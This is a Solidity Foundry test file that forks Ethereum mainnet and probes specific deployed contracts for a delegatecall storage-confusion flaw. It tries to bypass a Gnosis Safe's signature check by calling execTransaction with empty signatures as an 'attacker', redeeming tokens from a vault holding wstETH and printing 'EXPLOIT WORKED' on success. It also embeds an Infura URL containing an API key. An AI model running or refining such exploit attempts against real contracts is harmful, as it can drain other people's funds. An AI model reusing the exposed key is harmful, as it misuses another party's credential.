// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IGnosisSafe {
    function getOwners() external view returns (address[] memory);
    function getThreshold() external view returns (uint256);
    function nonce() external view returns (uint256);
    function isOwner(address) external view returns (bool);
    function execTransaction(
        address to,
        uint256 value,
        bytes calldata data,
        uint8 operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address payable refundReceiver,
        bytes memory signatures
    ) external payable returns (bool);
}

contract StorageConfusionExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant GNOSIS_SAFE = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
    address constant GNOSIS_SINGLETON = 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CompareStorageLayouts() public view {
        console.log("=== COMPARING STORAGE LAYOUTS ===\n");

        // Gnosis Safe storage layout:
        // slot 0: singleton (implementation)
        // slot 1: unused
        // slot 2: owners mapping
        // slot 3: ownerCount
        // slot 4: threshold
        // slot 5: nonce

        console.log("GNOSIS_SAFE storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(GNOSIS_SAFE, bytes32(i));
            console.log("  Slot", i, ":");
            console.logBytes32(slot);
        }

        console.log("\nREDEMPTION_1 storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(REDEMPTION_1, bytes32(i));
            console.log("  Slot", i, ":");
            console.logBytes32(slot);
        }

        // Compare key values
        console.log("\n=== KEY COMPARISONS ===");

        // Safe's slot 4 = threshold (should be 2)
        console.log("GNOSIS_SAFE slot 4 (threshold):", uint256(vm.load(GNOSIS_SAFE, bytes32(uint256(4)))));

        // REDEMPTION_1's slot 4 = Gnosis Safe address
        console.log("REDEMPTION_1 slot 4 (Safe addr):");
        console.logBytes32(vm.load(REDEMPTION_1, bytes32(uint256(4))));

        // If REDEMPTION_1 delegatecalls to Safe and Safe reads slot 4 for threshold...
        // It would read the Gnosis Safe address as threshold!
        // That's a huge number > any reasonable threshold

        // Safe's slot 3 = ownerCount (should be 4)
        console.log("\nGNOSIS_SAFE slot 3 (ownerCount):", uint256(vm.load(GNOSIS_SAFE, bytes32(uint256(3)))));

        // REDEMPTION_1's slot 3 might be different
        console.log("REDEMPTION_1 slot 3:", uint256(vm.load(REDEMPTION_1, bytes32(uint256(3)))));
    }

    function test_TrySafeFunctionsViaRedemption1() public {
        console.log("=== TRYING SAFE FUNCTIONS VIA REDEMPTION_1 ===\n");

        // If REDEMPTION_1 forwards Safe functions via delegatecall,
        // and storage is confused, we might be able to exploit

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // Try calling Safe's functions through REDEMPTION_1
        console.log("Trying getOwners():");
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSignature("getOwners()")
        );
        console.log("  Success:", s1);
        if (s1 && d1.length > 0) {
            console.log("  Return data length:", d1.length);
        }

        console.log("\nTrying getThreshold():");
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSignature("getThreshold()")
        );
        console.log("  Success:", s2);
        if (s2 && d2.length >= 32) {
            uint256 threshold = abi.decode(d2, (uint256));
            console.log("  Threshold:", threshold);
        }

        console.log("\nTrying isOwner(attacker):");
        vm.startPrank(attacker);
        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSignature("isOwner(address)", attacker)
        );
        console.log("  Success:", s3);
        if (s3 && d3.length >= 32) {
            bool isOwn = abi.decode(d3, (bool));
            console.log("  Is owner:", isOwn);
        }

        console.log("\nTrying nonce():");
        (bool s4, bytes memory d4) = REDEMPTION_1.call(
            abi.encodeWithSignature("nonce()")
        );
        console.log("  Success:", s4);
        if (s4 && d4.length >= 32) {
            uint256 nonce = abi.decode(d4, (uint256));
            console.log("  Nonce:", nonce);
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** STORAGE CONFUSION EXPLOIT WORKED! ***");
        }
    }

    function test_TryExecTransactionViaRedemption1() public {
        console.log("=== TRYING EXECTRANSACTION VIA REDEMPTION_1 ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        // If REDEMPTION_1 forwards execTransaction to Safe's code,
        // but with REDEMPTION_1's storage...
        // The threshold check might pass because storage is confused!

        bytes memory rcRedeemCall = abi.encodeWithSignature(
            "redeem(uint256,address)",
            500e18,
            attacker
        );

        console.log("Trying execTransaction with no signatures:");
        (bool success, bytes memory returnData) = REDEMPTION_1.call(
            abi.encodeWithSignature(
                "execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)",
                REDEMPTION_CONTROLLER, // to
                0, // value
                rcRedeemCall, // data
                0, // operation (CALL)
                0, // safeTxGas
                0, // baseGas
                0, // gasPrice
                address(0), // gasToken
                address(0), // refundReceiver
                "" // no signatures!
            )
        );

        console.log("  Success:", success);
        if (!success && returnData.length >= 4) {
            console.log("  Error:");
            console.logBytes4(bytes4(returnData));
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerWstETH / 1e18);

        if (attackerWstETH > 0) {
            console.log("\n*** EXECTRANSACTION EXPLOIT WORKED! ***");
        }
    }

    function test_CheckSlot4LoadingBehavior() public {
        console.log("=== CHECKING SLOT 4 LOADING BEHAVIOR ===\n");

        // DELEGATECALL #4 at offset 2709 has "PUSH value: 4" then SLOAD
        // This means it loads from slot 4

        // REDEMPTION_1 slot 4 = 0xb38f2acb7b562475908c0c6e80a045deb4023f70 (Gnosis Safe)

        // When executed:
        // 1. PUSH 4
        // 2. SLOAD -> loads Safe address from slot 4
        // 3. DELEGATECALL to that address

        // So the delegatecall target is the Gnosis Safe proxy
        // Not the singleton!

        // The Safe proxy itself has code that delegatecalls to singleton
        // So the chain is: REDEMPTION_1 -> Safe proxy -> Safe singleton

        // In this case, storage is:
        // - REDEMPTION_1's storage (for REDEMPTION_1's delegatecall)
        // - But then Safe proxy's code runs... which also delegatecalls

        // Wait, let me think about this more carefully...
        // When REDEMPTION_1 delegatecalls to Safe proxy, the code executes in REDEMPTION_1 context
        // Safe proxy's code then delegatecalls to singleton (from Safe proxy's slot 0)
        // But in REDEMPTION_1 context, slot 0 = owner (0x2225dabffc7f862c99477381e971e8b1fdab467e)

        // So the nested delegatecall would go to the OWNER address!
        // If owner has code, it would execute in REDEMPTION_1's context!

        address r1Owner = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;
        console.log("REDEMPTION_1 owner (slot 0):", r1Owner);
        console.log("Owner code size:", r1Owner.code.length);

        // If owner is a contract, this could be exploitable!
        if (r1Owner.code.length > 0) {
            console.log("\n*** OWNER IS A CONTRACT! ***");
            console.log("This could be exploitable if owner has callable functions");
        }
    }

    function test_AnalyzeOwnerContract() public view {
        console.log("=== ANALYZING OWNER CONTRACT ===\n");

        address owner = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

        bytes memory code = owner.code;
        console.log("Owner code size:", code.length);

        if (code.length == 0) {
            console.log("Owner is an EOA, not exploitable via this path");
            return;
        }

        // If owner is a contract, analyze it
        console.log("\nOwner contract function selectors:");
        for (uint i = 0; i + 4 < code.length && i < 500; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel != 0xffffffff) {
                    console.logBytes4(sel);
                }
            }
        }

        // Check owner's storage
        console.log("\nOwner storage:");
        for (uint i = 0; i < 5; i++) {
            bytes32 slot = vm.load(owner, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("  Slot", i, ":");
                console.logBytes32(slot);
            }
        }
    }
}
